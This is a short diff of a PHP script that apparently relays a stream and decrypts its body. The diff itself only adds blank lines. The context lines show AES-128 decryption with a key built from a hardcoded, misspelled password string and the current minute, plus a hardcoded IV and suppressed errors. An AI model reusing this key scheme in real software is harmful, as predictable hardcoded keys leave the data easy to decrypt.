@@ -53,6 +53,7 @@ if (!$fp) {
     echo "Local:$status";
     die;
 }
+
 $stat = @stream_get_meta_data($fp);
  $is_text = false;
 if (isset($stat['wrapper_data'])) {
@@ -73,6 +74,7 @@ if($is_text) {
 $dkey = date('(#Y--m-d-@--H-i%)');
 $predkey = date('(#Y--m-d-@--H-i%)', strtotime('-1 Minute'));
 $nextdkey = date('(#Y--m-d-@--H-i%)', strtotime('+1 Minute'));
+
 @fpassthru($fp);
 if($is_text) {
     $body = @openssl_decrypt(ob_get_contents(),'aes128',md5('this body passowrd'.$dkey),0,  md5($t.'this body iv', true));
